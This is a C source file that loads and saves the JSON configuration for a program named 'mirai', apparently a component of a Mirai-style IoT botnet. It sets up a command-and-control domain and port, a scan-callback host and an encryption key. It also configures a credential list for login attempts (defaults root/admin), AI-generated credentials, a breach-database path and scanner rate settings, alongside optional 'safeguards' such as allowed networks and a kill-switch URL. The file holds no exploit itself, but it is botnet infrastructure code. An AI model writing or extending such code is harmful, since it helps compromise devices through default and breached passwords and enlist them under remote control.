#define _GNU_SOURCE
#include "config_loader.h"
#include "logger.h"

#include <json-c/json.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static char *json_get_string(json_object *jobj, const char *key,
                             const char *default_value) {
  json_object *tmp;
  if (json_object_object_get_ex(jobj, key, &tmp)) {
    const char *str = json_object_get_string(tmp);
    return str ? strdup(str) : NULL;
  }
  return default_value ? strdup(default_value) : NULL;
}

static int64_t json_get_int(json_object *jobj, const char *key,
                            int64_t default_value) {
  json_object *tmp;
  if (json_object_object_get_ex(jobj, key, &tmp)) {
    return json_object_get_int64(tmp);
  }
  return default_value;
}

static bool json_get_bool(json_object *jobj, const char *key,
                          bool default_value) {
  json_object *tmp;
  if (json_object_object_get_ex(jobj, key, &tmp)) {
    return json_object_get_boolean(tmp);
  }
  return default_value;
}

static result_t load_network_config(json_object *jobj,
                                    network_config_t *config) {
  json_object *network_obj;
  if (!json_object_object_get_ex(jobj, "network", &network_obj)) {
    return RESULT_ERROR("Missing 'network' section", 1);
  }

  config->cnc_domain = json_get_string(network_obj, "cnc_domain", "localhost");
  config->cnc_port = (uint16_t)json_get_int(network_obj, "cnc_port", 23);
  config->scan_callback_domain =
      json_get_string(network_obj, "scan_callback_domain", "localhost");
  config->scan_callback_port =
      (uint16_t)json_get_int(network_obj, "scan_callback_port", 48101);
  config->use_encryption = json_get_bool(network_obj, "use_encryption", true);
  config->encryption_key = json_get_string(network_obj, "encryption_key", NULL);

  return RESULT_OK;
}

static result_t load_credentials_config(json_object *jobj,
                                        credentials_config_t *config) {
  json_object *creds_obj;
  if (!json_object_object_get_ex(jobj, "credentials", &creds_obj)) {
    return RESULT_ERROR("Missing 'credentials' section", 2);
  }

  // Load credential list
  json_object *cred_list;
  if (json_object_object_get_ex(creds_obj, "list", &cred_list)) {
    size_t count = json_object_array_length(cred_list);
    config->credentials = calloc(count, sizeof(credential_t));
    if (!config->credentials && count > 0) {
      log_error("Failed to allocate credentials array");
      return RESULT_ERROR("Memory allocation failed", 2);
    }
    config->credential_count = count;

    for (size_t i = 0; i < count; i++) {
      json_object *cred = json_object_array_get_idx(cred_list, i);
      config->credentials[i].username =
          json_get_string(cred, "username", "root");
      config->credentials[i].password =
          json_get_string(cred, "password", "admin");
      config->credentials[i].weight = (uint16_t)json_get_int(cred, "weight", 1);
    }
  } else {
    config->credentials = NULL;
    config->credential_count = 0;
  }

  // AI generation settings
  config->ai_generation_enabled =
      json_get_bool(creds_obj, "ai_generation_enabled", false);
  config->ai_model_path = json_get_string(creds_obj, "ai_model_path", NULL);
  config->breach_database_path =
      json_get_string(creds_obj, "breach_database_path", NULL);

  return RESULT_OK;
}

static result_t load_scanner_config(json_object *jobj,
                                    scanner_config_t *config) {
  json_object *scanner_obj;
  if (!json_object_object_get_ex(jobj, "scanner", &scanner_obj)) {
    return RESULT_ERROR("Missing 'scanner' section", 3);
  }

  config->max_connections =
      (uint32_t)json_get_int(scanner_obj, "max_connections", 256);
  config->scan_rate_pps =
      (uint32_t)json_get_int(scanner_obj, "scan_rate_pps", 160);
  config->timeout_seconds =
      (uint32_t)json_get_int(scanner_obj, "timeout_seconds", 30);
  config->randomize_scan_order =
      json_get_bool(scanner_obj, "randomize_scan_order", true);

  // Excluded networks
  json_object *excluded;
  if (json_object_object_get_ex(scanner_obj, "excluded_networks", &excluded)) {
    size_t count = json_object_array_length(excluded);
    config->excluded_networks = calloc(count, sizeof(char *));
    config->excluded_network_count = count;

    for (size_t i = 0; i < count; i++) {
      json_object *net = json_object_array_get_idx(excluded, i);
      config->excluded_networks[i] = strdup(json_object_get_string(net));
    }
  } else {
    config->excluded_networks = NULL;
    config->excluded_network_count = 0;
  }

  return RESULT_OK;
}

static result_t load_safeguards_config(json_object *jobj,
                                       safeguards_config_t *config) {
  json_object *safeguards_obj;
  if (!json_object_object_get_ex(jobj, "safeguards", &safeguards_obj)) {
    // Safeguards are optional but recommended
    config->enabled = false;
    return RESULT_OK;
  }

  config->enabled = json_get_bool(safeguards_obj, "enabled", true);
  config->max_runtime_seconds =
      (uint64_t)json_get_int(safeguards_obj, "max_runtime_seconds", 3600);
  config->require_authorization =
      json_get_bool(safeguards_obj, "require_authorization", true);
  config->kill_switch_url =
      json_get_string(safeguards_obj, "kill_switch_url", NULL);

  // Allowed networks
  json_object *allowed;
  if (json_object_object_get_ex(safeguards_obj, "allowed_networks", &allowed)) {
    size_t count = json_object_array_length(allowed);
    config->allowed_networks = calloc(count, sizeof(char *));
    config->allowed_network_count = count;

    for (size_t i = 0; i < count; i++) {
      json_object *net = json_object_array_get_idx(allowed, i);
      config->allowed_networks[i] = strdup(json_object_get_string(net));
    }
  } else {
    config->allowed_networks = NULL;
    config->allowed_network_count = 0;
  }

  return RESULT_OK;
}

result_t config_load(const char *filepath, mirai_config_t *config) {
  log_info("Loading configuration from: %s", filepath);

  // Read file
  FILE *fp = fopen(filepath, "r");
  if (!fp) {
    log_error("Failed to open config file: %s", filepath);
    return RESULT_ERROR("Failed to open config file", 10);
  }

  // Get file size
  if (fseek(fp, 0, SEEK_END) != 0) {
    log_error("Failed to seek to end of file: %s", filepath);
    fclose(fp);
    return RESULT_ERROR("Failed to seek in config file", 10);
  }

  long fsize = ftell(fp);
  if (fsize == -1) {
    log_error("Failed to get file size: %s", filepath);
    fclose(fp);
    return RESULT_ERROR("Failed to determine config file size", 10);
  }

// Sanity check file size (max 10MB for config)
#define MAX_CONFIG_SIZE (10 * 1024 * 1024)
  if (fsize > MAX_CONFIG_SIZE) {
    log_error("Config file too large: %ld bytes (max %d)", fsize,
              MAX_CONFIG_SIZE);
    fclose(fp);
    return RESULT_ERROR("Config file exceeds size limit", 10);
  }

  if (fseek(fp, 0, SEEK_SET) != 0) {
    log_error("Failed to seek to start of file: %s", filepath);
    fclose(fp);
    return RESULT_ERROR("Failed to seek in config file", 10);
  }

  // Read content
  char *content = malloc(fsize + 1);
  if (!content) {
    log_error("Failed to allocate memory for config file");
    fclose(fp);
    return RESULT_ERROR("Memory allocation failed", 10);
  }

  size_t bytes_read = fread(content, 1, fsize, fp);
  if (bytes_read != (size_t)fsize) {
    log_error("Failed to read config file: expected %ld, got %zu", fsize,
              bytes_read);
    free(content);
    fclose(fp);
    return RESULT_ERROR("Failed to read config file completely", 10);
  }

  content[bytes_read] = 0;
  fclose(fp);

  // Parse JSON
  json_object *jobj = json_tokener_parse(content);
  free(content);

  if (!jobj) {
    log_error("Failed to parse JSON config file");
    return RESULT_ERROR("Invalid JSON format", 11);
  }

  // Load component name
  config->component_name = json_get_string(jobj, "component", "mirai");

  // Load sections
  result_t result;

  result = load_network_config(jobj, &config->network);
  if (!result.success) {
    json_object_put(jobj);
    return result;
  }

  result = load_credentials_config(jobj, &config->credentials);
  if (!result.success) {
    json_object_put(jobj);
    return result;
  }

  result = load_scanner_config(jobj, &config->scanner);
  if (!result.success) {
    json_object_put(jobj);
    return result;
  }

  result = load_safeguards_config(jobj, &config->safeguards);
  if (!result.success) {
    json_object_put(jobj);
    return result;
  }

  json_object_put(jobj);

  log_info("Configuration loaded successfully");
  return RESULT_OK;
}

void config_free(mirai_config_t *config) {
  if (!config) {
    return;
  }

  // Free network config
  free(config->network.cnc_domain);
  free(config->network.scan_callback_domain);
  free(config->network.encryption_key);

  // Free credentials
  for (size_t i = 0; i < config->credentials.credential_count; i++) {
    free(config->credentials.credentials[i].username);
    free(config->credentials.credentials[i].password);
  }
  free(config->credentials.credentials);
  free(config->credentials.ai_model_path);
  free(config->credentials.breach_database_path);

  // Free scanner config
  for (size_t i = 0; i < config->scanner.excluded_network_count; i++) {
    free(config->scanner.excluded_networks[i]);
  }
  free(config->scanner.excluded_networks);

  // Free safeguards
  for (size_t i = 0; i < config->safeguards.allowed_network_count; i++) {
    free(config->safeguards.allowed_networks[i]);
  }
  free(config->safeguards.allowed_networks);
  free(config->safeguards.kill_switch_url);

  free(config->component_name);
}

result_t config_validate(const mirai_config_t *config) {
  if (!config->network.cnc_domain) {
    return RESULT_ERROR("Missing CNC domain", 20);
  }

  if (config->credentials.credential_count == 0 &&
      !config->credentials.ai_generation_enabled) {
    return RESULT_ERROR("No credentials configured and AI generation disabled",
                        21);
  }

  if (config->safeguards.enabled &&
      config->safeguards.allowed_network_count == 0) {
    log_warn("Safeguards enabled but no allowed networks configured");
  }

  return RESULT_OK;
}

result_t config_save(const char *filepath, const mirai_config_t *config) {
  json_object *jobj = json_object_new_object();

  // Component name
  json_object_object_add(jobj, "component",
                         json_object_new_string(config->component_name));

  // Network section
  json_object *network = json_object_new_object();
  json_object_object_add(network, "cnc_domain",
                         json_object_new_string(config->network.cnc_domain));
  json_object_object_add(network, "cnc_port",
                         json_object_new_int(config->network.cnc_port));
  json_object_object_add(jobj, "network", network);

  // Write to file
  const char *json_str =
      json_object_to_json_string_ext(jobj, JSON_C_TO_STRING_PRETTY);
  FILE *fp = fopen(filepath, "w");
  if (!fp) {
    json_object_put(jobj);
    return RESULT_ERROR("Failed to open file for writing", 30);
  }

  fprintf(fp, "%s\n", json_str);
  fclose(fp);

  json_object_put(jobj);
  return RESULT_OK;
}
